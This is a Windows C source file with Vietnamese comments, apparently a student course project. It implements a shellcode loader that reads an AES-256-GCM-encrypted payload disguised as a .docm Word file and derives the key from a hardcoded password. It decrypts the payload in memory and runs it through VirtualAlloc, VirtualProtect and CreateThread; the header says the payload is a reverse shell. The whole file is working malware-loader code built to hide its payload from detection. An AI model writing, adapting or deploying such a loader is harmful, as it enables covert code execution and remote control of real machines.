/*
 * AES-256-GCM Shellcode Loader with Memory Injection
 * 1. Đọc file BT7.docm (encrypted shellcode)
 * 2. Giải mã bằng AES-256-GCM
 * 3. Memory injection: VirtualAlloc -> memcpy -> VirtualProtect -> CreateThread
 * 4. Shellcode thực thi reverse shell
 */

#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>

#pragma comment(lib, "bcrypt.lib")

// Cấu hình mã hóa
#define AES_KEY_SIZE 32      // AES-256
#define SALT_SIZE 16
#define NONCE_SIZE 12        // GCM nonce
#define TAG_SIZE 16          // GCM authentication tag

// Password để derive key
const char* PASSWORD = "NT230_Group5_Key";

// Tên file encrypted shellcode - sẽ đổi tên thành .docm
const char* ENCRYPTED_FILE = "BT7.docm";

/*
 * Derive AES key từ password sử dụng PBKDF2
 */
BOOL DeriveKeyFromPassword(
    const char* password,
    BYTE* salt,
    DWORD saltLen,
    BYTE* key,
    DWORD keyLen
) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    NTSTATUS status;
    BOOL result = FALSE;

    // Mở SHA256 algorithm provider cho PBKDF2
    status = BCryptOpenAlgorithmProvider(
        &hAlg,
        BCRYPT_SHA256_ALGORITHM,
        NULL,
        BCRYPT_ALG_HANDLE_HMAC_FLAG
    );
    
    if (!BCRYPT_SUCCESS(status)) {
        return FALSE;
    }

    // Derive key với PBKDF2
    status = BCryptDeriveKeyPBKDF2(
        hAlg,
        (PUCHAR)password,
        strlen(password),
        salt,
        saltLen,
        100000,  // iterations - phải khớp với Python
        key,
        keyLen,
        0
    );

    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    BCryptCloseAlgorithmProvider(hAlg, 0);
    return TRUE;
}

/*
 * Giải mã AES-256-GCM sử dụng BCrypt API
 */
BOOL DecryptAESGCM(
    BYTE* encrypted,
    DWORD encryptedLen,
    BYTE* key,
    BYTE* nonce,
    BYTE** decrypted,
    DWORD* decryptedLen
) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    BOOL result = FALSE;

    // Mở AES-GCM algorithm
    status = BCryptOpenAlgorithmProvider(
        &hAlg,
        BCRYPT_AES_ALGORITHM,
        NULL,
        0
    );
    if (!BCRYPT_SUCCESS(status)) {
        return FALSE;
    }

    // Set chaining mode to GCM
    status = BCryptSetProperty(
        hAlg,
        BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
        sizeof(BCRYPT_CHAIN_MODE_GCM),
        0
    );
    if (!BCRYPT_SUCCESS(status)) {
        goto cleanup;
    }

    // Import key
    status = BCryptGenerateSymmetricKey(
        hAlg,
        &hKey,
        NULL,
        0,
        key,
        AES_KEY_SIZE,
        0
    );
    if (!BCRYPT_SUCCESS(status)) {
        goto cleanup;
    }

    // Prepare auth info for GCM
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = NONCE_SIZE;
    authInfo.pbTag = encrypted + encryptedLen - TAG_SIZE;  // Tag ở cuối
    authInfo.cbTag = TAG_SIZE;

    // Allocate output buffer
    *decryptedLen = encryptedLen - TAG_SIZE;
    *decrypted = (BYTE*)VirtualAlloc(NULL, *decryptedLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*decrypted == NULL) {
        goto cleanup;
    }

    // Decrypt
    ULONG bytesDecrypted = 0;
    status = BCryptDecrypt(
        hKey,
        encrypted,
        encryptedLen - TAG_SIZE,  // Không bao gồm tag
        &authInfo,
        NULL,
        0,
        *decrypted,
        *decryptedLen,
        &bytesDecrypted,
        0
    );

    if (!BCRYPT_SUCCESS(status)) {
        VirtualFree(*decrypted, 0, MEM_RELEASE);
        *decrypted = NULL;
        goto cleanup;
    }

    *decryptedLen = bytesDecrypted;
    result = TRUE;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

/*
 * Đọc encrypted shellcode từ file
 */
BOOL ReadEncryptedFile(
    const char* filename,
    BYTE** salt,
    BYTE** nonce,
    BYTE** encrypted,
    DWORD* encryptedLen
) {
    HANDLE hFile = CreateFileA(
        filename,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    // Get file size
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize < SALT_SIZE + NONCE_SIZE) {
        CloseHandle(hFile);
        return FALSE;
    }

    // Allocate buffers
    *salt = (BYTE*)malloc(SALT_SIZE);
    *nonce = (BYTE*)malloc(NONCE_SIZE);
    *encryptedLen = fileSize - SALT_SIZE - NONCE_SIZE;
    *encrypted = (BYTE*)malloc(*encryptedLen);

    DWORD bytesRead;

    // Read salt
    if (!ReadFile(hFile, *salt, SALT_SIZE, &bytesRead, NULL)) {
        goto error;
    }

    // Read nonce
    if (!ReadFile(hFile, *nonce, NONCE_SIZE, &bytesRead, NULL)) {
        goto error;
    }

    // Read encrypted data
    if (!ReadFile(hFile, *encrypted, *encryptedLen, &bytesRead, NULL)) {
        goto error;
    }

    CloseHandle(hFile);
    return TRUE;

error:
    free(*salt);
    free(*nonce);
    free(*encrypted);
    CloseHandle(hFile);
    return FALSE;
}

/*
 * Memory Injection - Inject shellcode vào memory và thực thi
 */
BOOL InjectAndExecuteShellcode(BYTE* shellcode, DWORD shellcodeLen) {
    DWORD oldProtect;

    // 1. VirtualAlloc - Cấp phát memory với quyền RW
    LPVOID execMem = VirtualAlloc(
        NULL,
        shellcodeLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (execMem == NULL) {
        return FALSE;
    }

    // 2. Copy shellcode vào memory
    memcpy(execMem, shellcode, shellcodeLen);

    // 3. VirtualProtect - Đổi quyền thành EXECUTE_READ
    if (!VirtualProtect(execMem, shellcodeLen, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFree(execMem, 0, MEM_RELEASE);
        return FALSE;
    }

    // 4. CreateThread - Tạo thread mới để chạy shellcode
    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)execMem,
        NULL,
        0,
        NULL
    );

    if (hThread == NULL) {
        VirtualFree(execMem, 0, MEM_RELEASE);
        return FALSE;
    }

    // 5. WaitForSingleObject - Chờ thread hoàn thành (hoặc timeout)
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    CloseHandle(hThread);
    VirtualFree(execMem, 0, MEM_RELEASE);

    return TRUE;
}

/*
 * Main entry point
 */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    BYTE* salt = NULL;
    BYTE* nonce = NULL;
    BYTE* encrypted = NULL;
    DWORD encryptedLen = 0;
    BYTE* shellcode = NULL;
    DWORD shellcodeLen = 0;
    BYTE key[AES_KEY_SIZE];

    // 1. Đọc encrypted shellcode từ file
    if (!ReadEncryptedFile(ENCRYPTED_FILE, &salt, &nonce, &encrypted, &encryptedLen)) {
        MessageBoxA(NULL, "Failed to read encrypted file", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    // 2. Derive key từ password
    if (!DeriveKeyFromPassword(PASSWORD, salt, SALT_SIZE, key, AES_KEY_SIZE)) {
        MessageBoxA(NULL, "Failed to derive key", "Error", MB_OK | MB_ICONERROR);
        goto cleanup;
    }

    // 3. Giải mã shellcode
    if (!DecryptAESGCM(encrypted, encryptedLen, key, nonce, &shellcode, &shellcodeLen)) {
        MessageBoxA(NULL, "Failed to decrypt shellcode", "Error", MB_OK | MB_ICONERROR);
        goto cleanup;
    }

    // 4. Inject và thực thi shellcode
    if (!InjectAndExecuteShellcode(shellcode, shellcodeLen)) {
        MessageBoxA(NULL, "Failed to execute shellcode", "Error", MB_OK | MB_ICONERROR);
        goto cleanup;
    }

cleanup:
    // Cleanup memory
    if (salt) free(salt);
    if (nonce) free(nonce);
    if (encrypted) free(encrypted);
    if (shellcode) VirtualFree(shellcode, 0, MEM_RELEASE);

    return 0;
}
